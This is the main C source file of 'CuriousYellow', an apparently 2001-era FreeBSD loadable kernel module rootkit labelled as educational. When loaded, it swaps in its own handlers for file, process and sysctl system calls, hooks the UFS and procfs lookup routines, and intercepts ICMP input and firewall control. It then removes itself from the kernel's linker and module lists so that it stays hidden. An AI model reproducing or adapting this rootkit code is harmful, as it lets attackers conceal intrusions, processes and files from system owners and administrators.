/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products 
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    $Id: cyellow.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This file contains the actual module.
 *
 *    This stuff was written for educational purposes only. 
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/lock.h>
#include <sys/select.h>
#include <sys/sysproto.h>
#include <netinet/in.h>
#include <netinet/ip_fw.h>
#include <netinet/ipprotosw.h>

#include "../config.h"
#include "vnode.h"
#include "file-sysc.h"
#include "file-ufs.h"
#include "icmp.h"
#include "control.h"
#include "util.h"
#include "process.h"
#include "fw.h"
#include "exec.h"
#include "icmp.h"

/* things we need to reference in the kernel */
extern struct vnodeopv_entry_desc procfs_vnodeop_entries[];
extern struct vnodeopv_desc **vnodeopv_descs;
extern vop_t **ufs_vnodeop_p;

vop_t *old_ufs_lookup;
vop_t *old_vfs_cache_lookup;

extern struct ipprotosw inetsw[];
extern u_char ip_protox[];

/* taken from /sys/kern/kern_module.c */
typedef TAILQ_HEAD(, module) modulelist_t;
struct module {
    TAILQ_ENTRY(module) link;           /* chain together all modules */
    TAILQ_ENTRY(module) flink;          /* all modules in a file */
    struct linker_file* file;           /* file which contains this module */
    int                 refs;           /* reference count */
    int                 id;             /* unique id number */
    char                *name;          /* module name */
    modeventhand_t      handler;        /* event handler */
    void                *arg;           /* argument for handler */
    modspecific_t       data;           /* module specific data */
};

extern linker_file_list_t linker_files;
extern int next_file_id;
extern struct lock lock;
extern modulelist_t modules;
extern int nextid;

vop_t *old_procfs_readdir;
vop_t *old_procfs_lookup;

void *old_icmp_input;

ip_fw_ctl_t *old_ip_fw_ctl_ptr;

/* definitions for the cy control system call */
static int offset = NO_SYSCALL;

static struct sysent cy_ctl_sysent = {
    2,
    (sy_call_t *)cy_ctl
};

/*
 *    this function will be called when the module is loaded and unloaded,
 *    so replacements/restorations can be done here
 */

static int
load(struct module *module, int cmd, void *arg)
{
    int s;
    int error = 0;

#ifdef STEALTH
    linker_file_t lf = 0;
    module_t mod = 0;
#endif

    switch(cmd) {
        case MOD_LOAD:
	    mod_debug("Loading CuriousYellow at %d\n",offset);

#ifdef FILE_SYSCALLS

            mod_debug("Replacing open call\n");
	    sysent[SYS_open]=new_open_sysent;

            mod_debug("Replacing getdirentries call\n");
	    sysent[SYS_getdirentries]=new_getdirentries_sysent;
			
	    mod_debug("Replacing stat call\n");
	    sysent[SYS_stat]=new_stat_sysent;

	    mod_debug("Replacing lstat call\n");	
	    sysent[SYS_lstat]=new_lstat_sysent;

	    mod_debug("Replacing chflags call\n");	
	    sysent[SYS_chflags]=new_chflags_sysent;

	    mod_debug("Replacing chmod call\n");	
	    sysent[SYS_chmod]=new_chmod_sysent;

	    mod_debug("Replacing chown call\n");	
	    sysent[SYS_chown]=new_chown_sysent;

	    mod_debug("Replacing rename call\n");	
	    sysent[SYS_rename]=new_rename_sysent;

	    mod_debug("Replacing unlink call\n");	
	    sysent[SYS_unlink]=new_unlink_sysent;

	    mod_debug("Replacing utimes call\n");	
	    sysent[SYS_utimes]=new_utimes_sysent;

	    mod_debug("Replacing truncate call\n");	
	    sysent[SYS_truncate]=new_truncate_sysent;

#endif
#ifdef FILE_UFS

            mod_debug("Replacing UFS lookup\n");
            old_ufs_lookup = ufs_vnodeop_p[VOFFSET(vop_lookup)];
            ufs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *) new_ufs_lookup;

            mod_debug("Replacing UFS cached lookup\n");
            old_vfs_cache_lookup = ufs_vnodeop_p[VOFFSET(vop_cachedlookup)];
            ufs_vnodeop_p[VOFFSET(vop_cachedlookup)] = (vop_t *) new_vfs_cache_lookup;
#endif
#if defined(PROCESS_HACKS) || defined(NETSTAT_HACK)

	    mod_debug("Replacing sysctl\n");
	    sysent[SYS___sysctl]=new_sysctl_sysent;
#endif
#ifdef PROCESS_HACKS
	    mod_debug("Replacing fork\n");
	    sysent[SYS_fork]=new_fork_sysent;

            mod_debug("Replacing kill\n");
	    sysent[SYS_kill]=new_kill_sysent;

	    mod_debug("Replacing procfs_lookup\n");
	    old_procfs_lookup = procfs_vnodeop_p[VOFFSET(vop_lookup)];
	    procfs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *)new_procfs_lookup;

	    mod_debug("Replacing procfs_readdir\n");
	    old_procfs_readdir = procfs_vnodeop_p[VOFFSET(vop_readdir)];
	    procfs_vnodeop_p[VOFFSET(vop_readdir)] = (vop_t *)new_procfs_readdir;
			
#endif

#ifdef NETWORK_HACKS

            /* lock network stuff */
            s = splnet();

            mod_debug("Replacing icmp_input\n");
            old_icmp_input = inetsw[ip_protox[IPPROTO_ICMP]].pr_input;
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = new_icmp_input;

	    mod_debug("Replacing ip_fw_ctl\n");
	    old_ip_fw_ctl_ptr = ip_fw_ctl_ptr;
	    ip_fw_ctl_ptr = new_ip_fw_ctl;

            /* unlock */
            splx(s);
#endif

#ifdef STEALTH

            /* go to stealth mode, eg hide the module itself */
            lockmgr(&lock, LK_EXCLUSIVE, 0, curproc);

            (&linker_files)->tqh_first->refs--;

            TAILQ_FOREACH(lf, &linker_files, link) {

                if (!strcmp(lf->filename, "cyellow.ko")) {

                   /*first let's decrement the global link file counter*/
                   next_file_id--;

                   /*now let's remove the entry*/
                   TAILQ_REMOVE(&linker_files, lf, link);
                   break;    
                }
            } 
            lockmgr(&lock, LK_RELEASE, 0, curproc);

            TAILQ_FOREACH(mod, &modules, link) {

                if(!strcmp(mod->name, "cy")) {
                    /*first let's patch the internal ID counter*/
                    nextid--;

                    TAILQ_REMOVE(&modules, mod, link);
                }
            }

#endif 
    
            break;

        case MOD_UNLOAD:
	    mod_debug("Unloading CuriousYellow at %d\n",offset);

#ifdef FILE_SYSCALLS

	    mod_debug("Restoring open\n");
	    sysent[SYS_open].sy_call = (sy_call_t *)open;

	    mod_debug("Restoring getdirentries\n");
	    sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries;

	    mod_debug("Restoring stat\n");
	    sysent[SYS_stat].sy_call = (sy_call_t *)stat;

	    mod_debug("Restoring lstat\n");
	    sysent[SYS_lstat].sy_call = (sy_call_t *)lstat;

            mod_debug("Restoring chflags call\n");
	    sysent[SYS_chflags].sy_call = (sy_call_t *)chflags;

            mod_debug("Restoring chmod call\n");
	    sysent[SYS_chmod].sy_call = (sy_call_t *)chmod;

            mod_debug("Restoring chown call\n");
	    sysent[SYS_chown].sy_call = (sy_call_t *)chown;

            mod_debug("Restoring rename call\n");
	    sysent[SYS_rename].sy_call = (sy_call_t *)rename;

            mod_debug("Restoring unlink call\n");
	    sysent[SYS_unlink].sy_call = (sy_call_t *)unlink;

            mod_debug("Restoring utimes call\n");
	    sysent[SYS_utimes].sy_call = (sy_call_t *)utimes;

            mod_debug("Restoring truncate call\n");
	    sysent[SYS_truncate].sy_call = (sy_call_t *)truncate;

#endif
#ifdef FILE_UFS

            mod_debug("Restoring UFS lookup\n");
            ufs_vnodeop_p[VOFFSET(vop_lookup)] = old_ufs_lookup;

            mod_debug("Restoring UFS cached lookup\n");
            ufs_vnodeop_p[VOFFSET(vop_cachedlookup)] = old_vfs_cache_lookup;
#endif
#if defined (PROCESS_HACKS) || defined (NETSTAT_HACK)

	    mod_debug("Restoring sysctl\n");
	    sysent[SYS___sysctl].sy_call = (sy_call_t *)__sysctl;
#endif

#ifdef PROCESS_HACKS
            mod_debug("Restoring fork\n");
	    sysent[SYS_fork].sy_call = (sy_call_t *)fork;

	    mod_debug("Restoring kill\n");
	    sysent[SYS_kill].sy_call = (sy_call_t *)kill;

	    mod_debug("Restoring procfs_lookup\n");
	    procfs_vnodeop_p[VOFFSET(vop_lookup)] = old_procfs_lookup;

	    mod_debug("Restoring procfs_readdir\n");
	    procfs_vnodeop_p[VOFFSET(vop_readdir)] = old_procfs_readdir;
#endif 

#ifdef NETWORK_HACKS

            /* hm... better safe then sorry */
            s = splnet();

            mod_debug("Restoring icmp_input\n");
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = old_icmp_input;

	    mod_debug("Restoring ip_fw_ctl\n");
	    ip_fw_ctl_ptr = old_ip_fw_ctl_ptr;

            splx(s);

#endif
			

	    break;

	default:
	    error = EINVAL;
	    break;

    }

    return(error);
}
SYSCALL_MODULE(cy, &offset, &cy_ctl_sysent, load, NULL);

